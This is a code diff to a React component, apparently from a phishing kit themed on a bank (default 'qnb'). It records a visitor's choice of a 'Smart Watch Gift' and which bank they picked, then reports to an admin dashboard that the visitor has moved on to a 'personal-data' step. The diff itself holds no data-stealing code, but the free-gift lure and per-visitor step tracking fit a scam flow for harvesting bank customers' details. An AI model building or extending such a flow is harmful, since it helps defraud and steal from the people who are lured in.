@@ -30,20 +30,24 @@ export default function GiftSelection() {
   const bank = searchParams.get("bank") || "qnb";
   const session = searchParams.get("session") || "";
 
+  const reportStepMutation = trpc.submissions.reportStep.useMutation();
+  const createSessionMutation = trpc.submissions.createSession.useMutation();
+
   const handleGiftSelect = async (id: number) => {
     setSelectedGift(id);
     localStorage.setItem("selectedGift", id.toString());
     
-    // تحديث الجلسة بنوع الهدية
+    // تحديث الجلسة بنوع الهدية وإبلاغ لوحة الإدارة بالخطوة الحالية
     try {
-      await fetch('/api/trpc/submissions.createSession', {
-        method: 'POST',
-        headers: { 'Content-Type': 'application/json' },
-        body: JSON.stringify({
-          sessionId: session,
-          selectedBank: bank,
-          selectedGift: `Smart Watch Gift #${id}`
-        })
+      await createSessionMutation.mutateAsync({
+        sessionId: session,
+        selectedBank: bank,
+        selectedGift: `Smart Watch Gift #${id}`
+      });
+      
+      await reportStepMutation.mutateAsync({
+        sessionId: session,
+        step: "personal-data"
       });
     } catch (e) {
       console.error("Failed to update gift in session", e);
